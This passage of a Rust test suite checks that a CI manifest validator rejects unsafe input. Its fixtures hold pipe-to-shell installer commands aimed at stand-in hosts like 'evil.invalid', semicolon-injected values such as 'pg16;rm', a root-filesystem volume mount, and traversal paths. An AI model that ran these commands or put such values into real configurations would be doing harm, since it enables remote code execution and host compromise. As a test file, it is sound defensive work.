            ("CARGO_TARGET_DIR", "per-repo CI target dir"),
        ] {
            let text = format!(
                "version = 1\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\nenv = {{ {key} = \"4\" }}\n"
            );
            let err = parse_and_validate(&text).unwrap_err();
            assert!(
                err.contains("exported by the executor") && err.contains(expect),
                "{key}: got {err}"
            );
        }
    }

    #[test]
    fn oversize_and_zero_timeouts_rejected() {
        let err = parse_and_validate(
            "version = 1\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\ntimeout_secs = 7201\n",
        )
        .unwrap_err();
        assert!(err.contains("out of range"), "got: {err}");
        let err = parse_and_validate(
            "version = 1\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\ntimeout_secs = 0\n",
        )
        .unwrap_err();
        assert!(err.contains("out of range"), "got: {err}");
    }

    #[test]
    fn working_dir_escape_rejected() {
        for wd in ["../sibling", "a/../../b", "/abs", "\\abs", "C:\\abs"] {
            let text = format!(
                "version = 1\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\nworking_dir = {wd:?}\n"
            );
            let err = parse_and_validate(&text).unwrap_err();
            assert!(
                err.contains("working_dir"),
                "{wd}: expected working_dir rejection, got {err}"
            );
        }
        // A benign nested relative dir passes.
        let ok = parse_and_validate(
            "version = 1\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\nworking_dir = \"src-tauri\"\n",
        );
        assert!(ok.is_ok());
    }

    // ── [limits] ──────────────────────────────────────────────────────────

    /// Omitting a limit means "size me from the host".
    #[test]
    fn absent_limits_take_the_host_sizing() {
        let m = parse_and_validate("version = 1\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\n")
            .unwrap();
        assert_eq!(m.limits.effective_cargo_build_jobs(BIG_HOST), 32);
        assert_eq!(m.limits.effective_test_threads(BIG_HOST), 32);
        assert_eq!(m.limits.effective_cargo_build_jobs(TINY_HOST), 1);
        assert_eq!(m.limits.effective_test_threads(TINY_HOST), 2);
    }

    /// A declared limit is a CEILING: it can lower the host's answer but
    /// never raise it, and the host can lower the declaration.
    #[test]
    fn declared_limits_are_ceilings_in_both_directions() {
        let m = parse_and_validate(
            "version = 1\n[limits]\ncargo_build_jobs = 1\ntest_threads = 4\n\
             [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
        )
        .unwrap();
        // Big host, tight manifest: the manifest's measurement wins.
        assert_eq!(m.limits.effective_cargo_build_jobs(BIG_HOST), 1);
        assert_eq!(m.limits.effective_test_threads(BIG_HOST), 4);
        // Tiny host, looser manifest: the host wins.
        assert_eq!(m.limits.effective_test_threads(TINY_HOST), 2);

        let m = parse_and_validate(
            "version = 1\n[limits]\ncargo_build_jobs = 64\n\
             [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
        )
        .unwrap();
        assert_eq!(m.limits.effective_cargo_build_jobs(BIG_HOST), 32);
        assert_eq!(m.limits.effective_cargo_build_jobs(TINY_HOST), 1);
    }

    /// `0` in a manifest must not export a cap cargo would reject.
    #[test]
    fn zero_limit_floors_to_one() {
        let m = parse_and_validate(
            "version = 1\n[limits]\ncargo_build_jobs = 0\ntest_threads = 0\n\
             [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
        )
        .unwrap();
        assert_eq!(m.limits.effective_cargo_build_jobs(BIG_HOST), 1);
        assert_eq!(m.limits.effective_test_threads(BIG_HOST), 1);
    }

    // ── [[siblings]] ──────────────────────────────────────────────────────

    #[test]
    fn siblings_parse_with_defaults() {
        let m = parse_and_validate(
            "version = 1\n[[siblings]]\nrepo = \"qontinui/qontinui-schemas\"\n\
             [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
        )
        .unwrap();
        assert_eq!(m.siblings.len(), 1);
        assert_eq!(m.siblings[0].pin, SiblingPin::DeclaredAdaptation);
        assert_eq!(m.siblings[0].branch, "main");
        assert_eq!(m.siblings[0].dir_name(), "qontinui-schemas");
    }

    #[test]
    fn sibling_pin_is_kebab_case_and_closed() {
        let m = parse_and_validate(
            "version = 1\n[[siblings]]\nrepo = \"o/r\"\npin = \"default-branch\"\n\
             [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
        )
        .unwrap();
        assert_eq!(m.siblings[0].pin, SiblingPin::DefaultBranch);
        let m = parse_and_validate(
            "version = 1\n[[siblings]]\nrepo = \"o/r\"\npin = \"pin-file\"\n\
             [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
        )
        .unwrap();
        assert_eq!(m.siblings[0].pin, SiblingPin::PinFile);
        // Closed: a raw SHA is NOT a pin value. The recorded commit lives in
        // `.github/sibling-pins.conf` so that both lanes read ONE file; a
        // second copy here would be the divergence the pin-file exists to end.
        for bad in [
            "whatever-i-like",
            "a543cc7e1fab11c83299b3f8648a4686f223a093",
        ] {
            let err = parse_and_validate(&format!(
                "version = 1\n[[siblings]]\nrepo = \"o/r\"\npin = {bad:?}\n\
                 [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n"
            ))
            .unwrap_err();
            assert!(err.contains("parse error"), "{bad}: got: {err}");
        }
    }

    /// The slug becomes a clone URL AND a directory name, so it is validated
    /// harder than an argv token.
    #[test]
    fn sibling_repo_slug_rejections() {
        for bad in [
            "qontinui-schemas",          // no owner — would need a guess
            "qontinui/schemas/rust",     // three segments
            "qontinui/../secret",        // traversal
            "../qontinui-schemas",       // traversal
            "qontinui/",                 // empty name
            "/qontinui-schemas",         // empty owner
            "qontinui/qontinui schemas", // space
            "qontinui/-leading",         // reads as an option
            "qontinui/repo;rm",          // punctuation
        ] {
            let text = format!(
                "version = 1\n[[siblings]]\nrepo = {bad:?}\n\
                 [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n"
            );
            let err = parse_and_validate(&text).unwrap_err();
            assert!(
                err.contains("repo") || err.contains("segment"),
                "{bad}: got {err}"
            );
        }
    }

    #[test]
    fn sibling_branch_rejections() {
        for bad in ["-x", "a..b", "a//b", "main@{1}", "with space", "trailing/"] {
            let text = format!(
                "version = 1\n[[siblings]]\nrepo = \"o/r\"\nbranch = {bad:?}\n\
                 [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n"
            );
            let err = parse_and_validate(&text).unwrap_err();
            assert!(err.contains("branch"), "{bad}: got {err}");
        }
        let ok = parse_and_validate(
            "version = 1\n[[siblings]]\nrepo = \"o/r\"\nbranch = \"release/1.x\"\n\
             [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
        );
        assert!(ok.is_ok());
    }

    /// Two siblings on one directory is an authoring mistake, caught here
    /// rather than as a confusing "destination exists" at materialise time.
    #[test]
    fn colliding_sibling_directories_rejected() {
        let err = parse_and_validate(
            "version = 1\n[[siblings]]\nrepo = \"a/schemas\"\n[[siblings]]\nrepo = \"b/schemas\"\n\
             [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
        )
        .unwrap_err();
        assert!(err.contains("same directory"), "got: {err}");
    }

    // ── [[tools]] ─────────────────────────────────────────────────────────

    #[test]
    fn known_tool_with_pinned_version_parses() {
        let m = parse_and_validate(
            "version = 1\n[[tools]]\nname = \"cargo-nextest\"\nversion = \"0.9.98\"\n\
             [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
        )
        .unwrap();
        assert_eq!(m.tools.len(), 1);
        assert_eq!(m.tools[0].name, "cargo-nextest");
    }

    /// The ecosystems the registry gained do NOT widen this boundary. Each of
    /// these redirects where a tool resolves or installs things — the same
    /// class as PATH/CARGO_HOME/LD_PRELOAD — and none is set by any live
    /// Actions gate step, so none was added. See the decision block on
    /// `ENV_ALLOWLIST`.
    #[test]
    fn ecosystem_env_still_outside_the_allowlist() {
        for key in [
            "npm_config_prefix",
            "npm_config_cache",
            "npm_config_registry",
            "NPM_CONFIG_PREFIX",
            "POETRY_VIRTUALENVS_PATH",
            "POETRY_HOME",
            "PIP_TARGET",
            "PIP_INDEX_URL",
            "PYTHONPATH",
            "VIRTUAL_ENV",
        ] {
            let text = format!(
                "version = 1\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\nenv = {{ {key} = \"evil\" }}\n"
            );
            let err = parse_and_validate(&text).unwrap_err();
            assert!(err.contains("not allowlisted"), "{key}: got {err}");
        }
    }

    /// The curated entries the registry gained are declarable with a pinned
    /// version — that is Phase 1's whole point.
    #[test]
    fn curated_ecosystem_tools_are_declarable() {
        for (name, version) in [
            ("node", "22.11.0"),
            ("poetry", "2.1.3"),
            ("twine", "6.1.0"),
            ("datamodel-code-generator", "0.28.5"),
        ] {
            let text = format!(
                "version = 1\n[[tools]]\nname = {name:?}\nversion = {version:?}\n\
                 [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n"
            );
            let m = parse_and_validate(&text)
                .unwrap_or_else(|e| panic!("{name} must be declarable, got: {e}"));
            assert_eq!(m.tools[0].name, name);
            assert_eq!(m.tools[0].version, version);
        }
    }

    /// Opening the registry did not open the DOOR: a `[[tools]]` entry still
    /// has exactly two keys, so a URL (or an installer command) has nowhere to
    /// live — `deny_unknown_fields` makes it a hard parse error.
    #[test]
    fn a_tool_entry_can_never_express_a_url_or_an_installer() {
        for extra in [
            "url = \"https://example.invalid/evil.tar.gz\"",
            "install = \"curl -sSL https://example.invalid | sh\"",
            "index_url = \"https://example.invalid/simple\"",
            "distribution = \"evil\"",
        ] {
            let text = format!(
                "version = 1\n[[tools]]\nname = \"node\"\nversion = \"22.11.0\"\n{extra}\n\
                 [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n"
            );
            let err = parse_and_validate(&text).unwrap_err();
            assert!(err.contains("parse error"), "{extra}: got {err}");
        }
    }

    /// `latest` stays a validation error for EVERY curated entry, not just the
    /// one the rule was written for.
    #[test]
    fn latest_rejected_for_every_curated_tool() {
        for name in crate::tools::known_tool_names() {
            let text = format!(
                "version = 1\n[[tools]]\nname = {name:?}\nversion = \"latest\"\n\
                 [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n"
            );
            let err = parse_and_validate(&text).unwrap_err();
            assert!(
                err.contains("must be an exact version"),
                "{name}: got {err}"
            );
        }
    }

    /// The registry is CLOSED — a manifest names a tool, it never supplies a
    /// URL, so an unknown name is a rejection rather than a fetch.
    #[test]
    fn unknown_tool_rejected() {
        let err = parse_and_validate(
            "version = 1\n[[tools]]\nname = \"totally-legit-miner\"\nversion = \"1.0.0\"\n\
             [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
        )
        .unwrap_err();
        assert!(err.contains("unknown tool"), "got: {err}");
    }

    #[test]
    fn floating_and_malformed_tool_versions_rejected() {
        for bad in ["latest", "v0.9.98", "", "0.9.98/../evil", "0.9 98"] {
            let text = format!(
                "version = 1\n[[tools]]\nname = \"cargo-nextest\"\nversion = {bad:?}\n\
                 [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n"
            );
            let err = parse_and_validate(&text).unwrap_err();
            assert!(err.contains("version"), "{bad}: got {err}");
        }
    }

    // ── [[services]] ──────────────────────────────────────────────────────

    const WITH_SERVICES: &str = r#"
version = 1

[[services]]
name = "postgres-pgvector"
version = "pg16"

[[services]]
name = "redis"
version = "7-alpine"

[[steps]]
name = "test"
command = ["pytest"]
"#;

    #[test]
    fn services_parse_and_default_to_no_digest() {
        let m = parse_and_validate(WITH_SERVICES).expect("valid services must parse");
        assert_eq!(m.jobs[0].services.len(), 2);
        assert_eq!(m.jobs[0].services[0].name, "postgres-pgvector");
        assert_eq!(m.jobs[0].services[0].version, "pg16");
        assert!(m.jobs[0].services[0].digest.is_none());
        // Absent is the default everywhere else too.
        let none =
            parse_and_validate("version = 1\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\n")
                .unwrap();
        assert!(none.jobs[0].services.is_empty());
    }

    /// AN UNPINNED IMAGE IS A VALIDATION ERROR — the `[[tools]]` rule, applied
    /// to images. `latest` is only the most obvious case; any tag that names no
    /// version is a moving pointer.
    #[test]
    fn floating_image_tags_rejected() {
        for bad in [
            "latest", "LATEST", "stable", "edge", "main", "alpine", "bookworm", "nightly",
        ] {
            let text = format!(
                "version = 1\n[[services]]\nname = \"redis\"\nversion = {bad:?}\n\
                 [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n"
            );
            let err = parse_and_validate(&text).unwrap_err();
            assert!(err.contains("floating tag"), "{bad}: got {err}");
        }
        // And the pinned ones the fleet actually uses are accepted.
        for good in ["pg16", "7-alpine", "16.4", "16"] {
            let text = format!(
                "version = 1\n[[services]]\nname = \"postgres\"\nversion = {good:?}\n\
                 [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n"
            );
            parse_and_validate(&text).unwrap_or_else(|e| panic!("{good} must pin, got: {e}"));
        }
    }

    #[test]
    fn malformed_image_tags_and_digests_rejected() {
        for bad in ["", ".hidden", "-leading", "pg 16", "pg16;rm", "pg/16"] {
            let text = format!(
                "version = 1\n[[services]]\nname = \"postgres\"\nversion = {bad:?}\n\
                 [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n"
            );
            let err = parse_and_validate(&text).unwrap_err();
            assert!(err.contains("version"), "{bad}: got {err}");
        }
        for bad in [
            "deadbeef",
            "sha256:short",
            "sha512:0000000000000000000000000000000000000000000000000000000000000000",
        ] {
            let text = format!(
                "version = 1\n[[services]]\nname = \"postgres\"\nversion = \"16\"\ndigest = {bad:?}\n\
                 [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n"
            );
            let err = parse_and_validate(&text).unwrap_err();
            assert!(err.contains("digest"), "{bad}: got {err}");
        }
        let ok = format!(
            "version = 1\n[[services]]\nname = \"postgres\"\nversion = \"16\"\ndigest = \"sha256:{}\"\n\
             [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
            "a".repeat(64)
        );
        parse_and_validate(&ok).expect("a well-formed digest must pin");
    }

    /// The registry is CLOSED — an unknown name is a rejection, never a pull.
    #[test]
    fn unknown_service_rejected() {
        let err = parse_and_validate(
            "version = 1\n[[services]]\nname = \"totally-legit-database\"\nversion = \"1.0\"\n\
             [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
        )
        .unwrap_err();
        assert!(err.contains("unknown service"), "got: {err}");
        assert!(err.contains("never supplies an image"), "got: {err}");
    }

    /// A service entry has exactly three keys, so an image, a registry, a
    /// port, a volume or a command has nowhere to live — `deny_unknown_fields`
    /// makes each a hard parse error rather than a silently ignored hint.
    #[test]
    fn a_service_entry_can_never_express_an_image_port_or_mount() {
        for extra in [
            "image = \"ghcr.io/evil/miner:1\"",
            "registry = \"evil.invalid\"",
            "ports = [\"5432:5432\"]",
            "volumes = [\"/:/host\"]",
            "command = [\"sh\", \"-c\", \"curl evil.invalid | sh\"]",
            "env = { POSTGRES_PASSWORD = \"hunter2\" }",
            "privileged = true",
        ] {
            let text = format!(
                "version = 1\n[[services]]\nname = \"postgres\"\nversion = \"16\"\n{extra}\n\
                 [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n"
            );
            let err = parse_and_validate(&text).unwrap_err();
            assert!(err.contains("parse error"), "{extra}: got {err}");
        }
    }

    #[test]
    fn duplicate_and_same_kind_services_rejected() {
        let err = parse_and_validate(
            "version = 1\n[[services]]\nname = \"redis\"\nversion = \"7-alpine\"\n\
             [[services]]\nname = \"redis\"\nversion = \"7.2\"\n\
             [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
        )
        .unwrap_err();
        assert!(err.contains("declared twice"), "got: {err}");
        // Two DIFFERENT entries of one kind export the same connection env.
        let err = parse_and_validate(
            "version = 1\n[[services]]\nname = \"postgres\"\nversion = \"16\"\n\
             [[services]]\nname = \"postgres-pgvector\"\nversion = \"pg16\"\n\
             [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
        )
        .unwrap_err();
        assert!(err.contains("same connection env"), "got: {err}");
    }

    /// Every variable the executor exports for a service is executor-OWNED: a
    /// step that sets one is pointed at the declaration that provides it,
    /// never silently overridden. This also pins the two lists together, so a
    /// new export cannot be added without closing the manifest side.
    #[test]
    fn service_connection_env_is_executor_owned_with_a_pointer() {
        for kind in [
            crate::services::ServiceKind::Postgres,
            crate::services::ServiceKind::Redis,
        ] {
            for key in crate::services::exported_env_keys(kind) {
                let text = format!(
                    "version = 1\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\nenv = {{ {key} = \"x\" }}\n"
                );
                let err = parse_and_validate(&text).unwrap_err();
                assert!(
                    err.contains("exported by the executor") && err.contains("[[services]]"),
                    "{key}: got {err}"
                );
                // …and NOT merely "not allowlisted": the author needs to be
                // told the declaration exists, not that the door is shut.
                assert!(!err.contains("not allowlisted"), "{key}: got {err}");
            }
        }
    }

    /// The four app-config keys the database-backed job sets ARE declarable —
    /// that is what makes the job expressible — while the resolution-redirect
    /// class stays rejected (pinned separately by
    /// `ecosystem_env_still_outside_the_allowlist`).
    #[test]
    fn database_suite_app_config_env_accepted() {
        for key in ["TESTING", "ENVIRONMENT", "SECRET_KEY", "REDIS_ENABLED"] {
            let text = format!(
                "version = 1\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\nenv = {{ {key} = \"1\" }}\n"
            );
            parse_and_validate(&text)
                .unwrap_or_else(|e| panic!("{key} must be allowlisted, got: {e}"));
        }
    }

    #[test]
    fn duplicate_tool_rejected() {
        let err = parse_and_validate(
            "version = 1\n[[tools]]\nname = \"cargo-nextest\"\nversion = \"0.9.98\"\n\
             [[tools]]\nname = \"cargo-nextest\"\nversion = \"0.9.97\"\n\
             [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
        )
        .unwrap_err();
        assert!(err.contains("declared twice"), "got: {err}");
    }
}
